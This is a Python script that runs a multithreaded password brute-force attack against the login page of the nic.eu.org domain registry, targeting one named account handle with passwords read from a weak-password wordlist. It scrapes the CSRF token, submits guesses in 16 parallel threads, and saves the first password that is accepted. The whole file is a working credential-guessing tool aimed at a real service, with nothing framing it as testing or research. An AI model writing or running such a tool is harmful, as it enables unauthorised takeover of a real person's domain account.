import sys
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import re
from datetime import datetime

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR_ENABLED = True
except ImportError:
    COLOR_ENABLED = False

LOGIN_PAGE = "https://nic.eu.org/arf/en/login/"
LOGIN_URL = "https://nic.eu.org/arf/en/login/?next=/arf/en/"
HANDLE = "JA110-FREE"
PASSWORD_FILE = "weakpass_4.txt"
FOUND_FLAG = "final.txt"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36"

found_event = threading.Event()
lock = threading.Lock()

def log(msg: str, level: str = "info") -> None:
    now = datetime.now().strftime("%H:%M:%S")
    if COLOR_ENABLED:
        colors = {
            "success": Fore.GREEN,
            "fail": Fore.RED,
            "warn": Fore.YELLOW,
        }
        color = colors.get(level, "")
        reset = Style.RESET_ALL if color else ""
        print(f"{color}[{now}] {msg}{reset}")
    else:
        print(f"[{now}] {msg}")

def check_password(password: str) -> bool:
    if not password.strip():
        log("[!] Empty password, skip.", "warn")
        return False

    if found_event.is_set():
        return False

    session = requests.Session()
    session.headers.update({"User-Agent": UA, "Referer": LOGIN_PAGE})

    try:
        r = session.get(LOGIN_PAGE, timeout=10)
        if r.status_code != 200:
            log(f"[!] Failed to load login page, status {r.status_code}", "warn")
            return False

        m = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', r.text)
        if not m:
            log("[!] Failed to get CSRF token", "warn")
            return False
        csrf_token = m.group(1)

        data = {
            "csrfmiddlewaretoken": csrf_token,
            "handle": HANDLE,
            "password": password,
            "next": "/arf/en/",
        }

        start = time.perf_counter()
        post_resp = session.post(LOGIN_URL, data=data, timeout=10)
        elapsed_ms = int((time.perf_counter() - start) * 1000)

        pwd_display = password.ljust(20)[:20]

        if post_resp.status_code in (403, 500) or "Your username and/or password is incorrect" in post_resp.text:
            log(f"[-] FAIL  | {elapsed_ms:5d} ms | {pwd_display} | HTTP {post_resp.status_code}", "fail")
            return False
        else:
            log(f"[+] FOUND | {elapsed_ms:5d} ms | {pwd_display}", "success")
            with lock:
                with open(FOUND_FLAG, "w", encoding="utf-8") as f:
                    f.write(password)
            found_event.set()
            return True

    except requests.RequestException as e:
        log(f"[!] Request exception for password '{password}': {e}", "warn")
        return False
    except Exception as e:
        log(f"[!] Unexpected exception for password '{password}': {e}", "warn")
        return False

def main() -> None:
    max_workers = 16
    if len(sys.argv) > 1:
        try:
            max_workers = int(sys.argv[1])
        except ValueError:
            log(f"[!] Invalid thread count parameter: {sys.argv[1]}, using default 16", "warn")

    log(f"Starting brute force with max_workers={max_workers}")

    with open(PASSWORD_FILE, encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_password, pwd): pwd for pwd in passwords}
        for future in as_completed(futures):
            if found_event.is_set():
                break

    if found_event.is_set():
        with open(FOUND_FLAG, encoding="utf-8") as f:
            pwd = f.read().strip()
        log(f"\n[✓] Correct password: {pwd}", "success")
    else:
        log("\n[✗] No valid password found.", "fail")

if __name__ == "__main__":
    main()
